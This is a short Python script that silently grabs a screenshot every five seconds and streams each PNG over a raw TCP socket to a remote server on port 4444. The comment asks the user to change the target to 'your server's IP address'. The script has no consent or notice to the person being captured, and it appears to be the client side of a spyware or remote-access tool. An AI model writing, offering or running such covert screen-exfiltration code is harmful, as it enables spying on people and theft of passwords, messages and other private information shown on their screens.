import socket
import io
import time
from PIL import ImageGrab

def send_screenshot(client_socket):
    try:
        while True:
            # Capture the screen
            img = ImageGrab.grab()
            with io.BytesIO() as buffer:
                img.save(buffer, format='PNG')
                img_data = buffer.getvalue()

            # Send the screenshot data to the server
            client_socket.sendall(b"SCREENSHOT" + img_data)

            # Wait before taking the next screenshot
            time.sleep(5)  # Adjust the interval as needed
    except Exception as e:
        print(f"Error: {e}")

def main():
    server_ip = "127.0.0.1"  # Change this to your server's IP address
    server_port = 4444
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    send_screenshot(client_socket)

if __name__ == "__main__":
    main()
